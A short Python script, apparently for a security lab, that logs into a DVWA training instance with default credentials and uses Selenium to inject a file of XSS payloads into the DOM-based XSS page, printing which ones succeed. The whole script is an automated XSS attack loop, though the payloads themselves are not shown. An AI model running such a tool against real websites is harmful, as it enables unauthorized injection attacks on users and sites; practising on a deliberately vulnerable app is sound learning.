from selenium import webdriver
from bs4 import BeautifulSoup as bs

file = open("/root/dvwa/xss","r")
inject = file.readlines()

browser = webdriver.Firefox()

LOGIN = "http://10.0.2.13:8080/login.php"
URL = "http://10.0.2.13:8080/vulnerabilities/xss_d/"

browser.get(LOGIN)
browser.find_element_by_name('username').send_keys('admin')
browser.find_element_by_name('password').send_keys('password')
browser.find_element_by_name('Login').click()

for i in inject:
    browser.get(URL+"?default="+i)
    html = browser.page_source
    soup = bs(html,'html.parser')
    vuln_area = soup.find('select',{'name':'default'})
    if(vuln_area.text.find("huti")!=-1):
        print("\n\n")
        print("XSS Success!!  "+i)
        print("\n\n")

browser.close()
